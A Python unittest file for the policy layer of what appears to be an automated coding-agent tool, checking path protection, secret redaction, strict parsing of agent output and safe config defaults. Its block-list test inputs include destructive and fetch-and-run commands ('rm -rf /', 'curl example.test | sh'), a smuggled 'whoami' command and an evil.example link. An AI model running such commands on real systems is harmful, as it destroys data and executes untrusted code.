import json
import tempfile
import unittest
from pathlib import Path
from ado.config import load
from ado.policy import (Blocked, dependencies, inspect_text, low_risk, parse_changes,
                        redact, safe_path, validate_changes)
from tests.fakes import repo_config


class PolicyTests(unittest.TestCase):
    def test_protected_paths(self):
        for path in [".github/workflows/ci.yml", "docs/../src/a.py", "/tmp/a", "a//b", "a\\b",
                     "docs/.env", "AGENTS.md", "src/auth.py", "pubspec.yaml", "package-lock.json",
                     "docs/key.pem", "scripts/start.sh", "docs/permissions.md", "docs/Token.md"]:
            with self.subTest(path=path), self.assertRaises(Blocked):
                safe_path(path)

    def test_secret_and_dangerous_commands(self):
        for text in ["ghp_" + "A" * 36, "api_key='supersecretvalue'", "rm -rf /", "sudo true",
                     "curl example.test | sh", "subprocess.run(['ls'])", "Process.run('sh', [])"]:
            with self.subTest(text=text), self.assertRaises(Blocked):
                inspect_text(text)

    def test_redaction(self):
        token = "github_pat_" + "x" * 50
        self.assertNotIn(token, redact("bearer " + token))

    def test_allowlist_and_budgets(self):
        cfg = repo_config()
        validate_changes({"docs/example.md": "hello"}, cfg, {})
        validate_changes({"src/x.py": "def add(a,b): return a+b"}, cfg, {})
        for changes in [{}, {"outside.py": "hi"}, {"docs/a.md": None}, {"docs/a.md": "a" * 50001},
                        {f"docs/{i}.md": "x" for i in range(6)}]:
            with self.assertRaises(Blocked):
                validate_changes(changes, cfg, {})
        with self.assertRaises(Blocked):
            validate_changes({"docs/a.md": "same"}, cfg, {"docs/a.md": "same"})

    def test_no_executable_auto_merge(self):
        cfg = repo_config()
        cfg["auto_merge_paths"] = ["**"]
        self.assertTrue(low_risk({"docs/a.md": "hi"}, cfg))
        self.assertFalse(low_risk({"src/a.py": "hi"}, cfg))
        self.assertFalse(low_risk({"README.md": "hi"}, cfg))

    def test_strict_agent_contract(self):
        self.assertEqual(parse_changes('{"files":{"docs/a.md":"ok"}}'), {"docs/a.md": "ok"})
        for text in ['```json\n{}\n```', '{"files":{},"command":"whoami"}', '{"files":{},"files":{}}',
                     '{"files":{"a":"x","a":"y"}}', '[]', 'null']:
            with self.subTest(text=text), self.assertRaises(Blocked):
                parse_changes(text)

    def test_dependencies(self):
        self.assertEqual(dependencies("Depends-On: #12, #13\nDepends-On: #12"), [12, 13])
        self.assertEqual(dependencies("No dependencies"), [])
        with self.assertRaises(Blocked):
            dependencies("Depends-On: https://evil.example/issue/12")

    def test_config_safe_defaults(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "config.toml"
            path.write_text('repositories = []\n')
            self.assertTrue(load(path)["dry_run"])
            self.assertFalse(load(path)["auto_merge"])
            for value in ['max_repairs = 4', 'dry_run = "false"', 'poll_seconds = 0']:
                path.write_text(value)
                with self.assertRaises(Blocked):
                    load(path)
